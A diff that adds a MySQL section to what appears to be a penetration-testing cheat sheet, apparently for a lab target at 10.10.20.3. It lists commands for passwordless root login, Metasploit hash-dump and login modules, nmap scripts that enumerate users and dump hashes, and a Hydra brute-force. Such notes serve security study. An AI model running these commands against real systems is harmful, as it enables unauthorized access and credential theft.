@@ -250,17 +250,42 @@ brows --startup-url 10.10.20.3
 lynx http://10.10.20.3
 ```
 
+#### /SQL:
 
-
-
-
-
-
-
-
-
-
-
+```
+mysql -h 10.10.20.3 -u root
+```
+Metasploit:
+```
+use auxiliary/scanner/mysql/mysql_writable_dirs
+set dir_list /usr/share/metasploit-framework/data/wordlists/directory.txt
+```
+```
+use auxiliary/scanner/mysql/mysql_hashdump
+```
+```
+use auxiliary/scanner/mysql/mysql_login
+```
+Nmap:
+```
+nmap 10.10.20.3 -sV -p 3306 --script=mysql-empty-passwords
+```
+```
+nmap 10.10.20.3 -sV -p 3306 --script=mysql-info
+```
+```
+nmap 10.10.20.3 -sV -p 3306 --script=mysql-users --script-args="mysqluser='root',mysqlpass=''"
+```
+```
+nmap 10.10.20.3 -sV -p 3306 --script=mysql-dump-hashes --script-args="username='root',password=''"
+```
+```
+nmap 10.10.20.3 -sV -p 3306 --script=mysql-query --script-args="query='select count(*) from books.authors;',username='root',password=''"
+```
+Hydra:
+```
+hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 10.10.20.3 mysql
+```
 
 
 
